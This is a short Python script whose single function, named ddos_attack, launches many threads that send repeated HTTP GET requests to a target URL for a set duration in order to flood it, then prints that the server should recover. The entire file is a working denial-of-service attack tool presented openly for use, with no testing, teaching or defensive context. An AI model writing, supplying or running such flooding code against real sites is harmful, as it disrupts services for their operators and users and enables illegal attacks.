import requests
import threading
import time

def ddos_attack(target_url, request_count, duration=20):
    stop_event = threading.Event()

    def send_request():
        while not stop_event.is_set():
            try:
                session = requests.Session()
                session.headers.update({'Connection': 'keep-alive'})
                response = session.get(target_url, timeout=5)
                print(f"Request sent, status code: {response.status_code}")
            except requests.RequestException as e:
                print(f"Error: {e}")

    threads = []
    for _ in range(request_count):
        thread = threading.Thread(target=send_request)
        thread.start()
        threads.append(thread)

    # Let the attack run for the specified duration (20 seconds)
    print(f"Starting DDoS attack on {target_url} for {duration} seconds...")
    time.sleep(duration)
    stop_event.set()  # Signal all threads to stop after the duration

    for thread in threads:
        thread.join()

    print("DDoS attack completed. The server should recover shortly.")
